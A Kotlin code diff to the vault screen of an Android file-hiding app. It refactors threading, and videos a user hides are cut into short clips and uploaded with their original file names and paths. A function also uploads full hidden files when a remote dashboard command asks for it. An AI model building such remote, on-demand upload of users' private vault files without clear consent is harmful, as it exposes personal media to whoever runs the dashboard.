@@ -6,7 +6,6 @@ import android.net.Uri
 import android.os.Bundle
 import android.util.Log
 import android.view.View
-import android.widget.TextView
 import android.widget.Toast
 import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AlertDialog
@@ -20,19 +19,17 @@ import com.example.data.VaultFileEntity
 import com.example.databinding.ActivityVaultBinding
 import com.example.databinding.BottomSheetHideOptionsBinding
 import com.example.databinding.DialogVaultSettingsBinding
+import com.example.firebase.FirebaseVaultUploader
 import com.example.utils.SafeFolderManager
 import com.example.utils.StoragePermissionUtils
 import com.example.utils.VaultUtils
+import com.example.utils.VideoClipExtractor
 import com.google.android.material.bottomsheet.BottomSheetDialog
 import com.google.android.material.tabs.TabLayout
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.flow.collectLatest
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
-
-// ✅ IMPORTS (Keep these for your app)
-import com.example.utils.VideoClipExtractor
-import com.example.firebase.FirebaseVaultUploader
 import java.io.File
 
 class VaultActivity : AppCompatActivity() {
@@ -40,7 +37,6 @@ class VaultActivity : AppCompatActivity() {
     private lateinit var binding: ActivityVaultBinding
     private lateinit var adapter: VaultFileAdapter
 
-    // ✅ FIREBASE UPLOADER (Supabase removed)
     private val firebaseUploader by lazy { FirebaseVaultUploader(this) }
 
     // Tab categories: Videos, Photos, Documents, Audio
@@ -260,7 +256,7 @@ class VaultActivity : AppCompatActivity() {
             addCategory(Intent.CATEGORY_OPENABLE)
             addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
             addFlags(Intent.FLAG_GRANT_WRITE_URI_PERMISSION)
-            
+
             if (fileType == SafeFolderManager.TYPE_DOCUMENT) {
                 putExtra(
                     Intent.EXTRA_MIME_TYPES,
@@ -297,7 +293,6 @@ class VaultActivity : AppCompatActivity() {
                     val saved = SafeFolderManager.hideFile(this@VaultActivity, uri, fileType)
                     if (saved != null) {
                         successCount++
-                        // ✅ Process and upload the video clip
                         processAndUploadClip(saved)
                     }
                 }
@@ -318,62 +313,53 @@ class VaultActivity : AppCompatActivity() {
         }
     }
 
-    // ============================================================
-    // ✅ PROCESS AND UPLOAD VIDEO CLIP (UPDATED)
-    // ============================================================
-
-    private fun processAndUploadClip(vaultFile: VaultFileEntity) {
+    private suspend fun processAndUploadClip(vaultFile: VaultFileEntity) {
         val file = File(vaultFile.savedPath)
         if (!file.exists()) {
-            Toast.makeText(this, "❌ File not found", Toast.LENGTH_SHORT).show()
+            withContext(Dispatchers.Main) {
+                Toast.makeText(this@VaultActivity, "❌ File not found", Toast.LENGTH_SHORT).show()
+            }
             return
         }
 
-        // Check if it's a video
-        if (vaultFile.mimeType.startsWith("video/")) {
-            // Extract 5-second 144p clip
-            val clipExtractor = VideoClipExtractor(this)
+        if (vaultFile.mimeType.startsWith("video/") || vaultFile.fileType == SafeFolderManager.TYPE_VIDEO) {
+            val clipExtractor = VideoClipExtractor(this@VaultActivity)
             val clipFile = clipExtractor.extractClip(file.absolutePath)
 
             if (clipFile == null) {
-                Toast.makeText(this, "❌ Could not extract clip", Toast.LENGTH_SHORT).show()
+                withContext(Dispatchers.Main) {
+                    Toast.makeText(this@VaultActivity, "❌ Could not extract clip", Toast.LENGTH_SHORT).show()
+                }
                 return
             }
 
-            // Upload clip to Google Drive
-            firebaseUploader.uploadVideoClip(clipFile) { success, message ->
-                if (success) {
-                    Toast.makeText(this, "✅ Clip uploaded to Drive", Toast.LENGTH_SHORT).show()
-                } else {
-                    Toast.makeText(this, "❌ Failed: $message", Toast.LENGTH_SHORT).show()
+            firebaseUploader.uploadVideoClip(
+                clipFile = clipFile,
+                originalFilePath = file.absolutePath,
+                originalFileName = vaultFile.fileName
+            ) { success, message ->
+                lifecycleScope.launch(Dispatchers.Main) {
+                    if (success) {
+                        Toast.makeText(this@VaultActivity, "✅ Clip uploaded to Drive", Toast.LENGTH_SHORT).show()
+                    } else {
+                        Toast.makeText(this@VaultActivity, "❌ Failed: $message", Toast.LENGTH_SHORT).show()
+                    }
                 }
             }
-        } else {
-            // For photos/audio, you might want to handle differently
-            Toast.makeText(this, "📄 Only videos get preview clips", Toast.LENGTH_SHORT).show()
         }
     }
 
-    // ============================================================
-    // ✅ FUNCTION FOR DASHBOARD COMMANDS (UPLOAD FULL FILE)
-    // ============================================================
-
-    /**
-     * Upload full file to Google Drive (called from dashboard command)
-     */
     fun uploadFullFileFromDashboard(fileId: String) {
         firebaseUploader.uploadFullFile(fileId) { success, message ->
-            if (success) {
-                Toast.makeText(this, "✅ Full file uploaded to Drive", Toast.LENGTH_SHORT).show()
-            } else {
-                Toast.makeText(this, "❌ Failed: $message", Toast.LENGTH_SHORT).show()
+            lifecycleScope.launch(Dispatchers.Main) {
+                if (success) {
+                    Toast.makeText(this@VaultActivity, "✅ Full file uploaded to Drive", Toast.LENGTH_SHORT).show()
+                } else {
+                    Toast.makeText(this@VaultActivity, "❌ Failed: $message", Toast.LENGTH_SHORT).show()
+                }
             }
         }
     }
-
-    // ============================================================
-    // EXISTING FUNCTIONS (Keep as they are)
-    // ============================================================
 
     private fun confirmDeleteFile(file: VaultFileEntity) {
         AlertDialog.Builder(this)
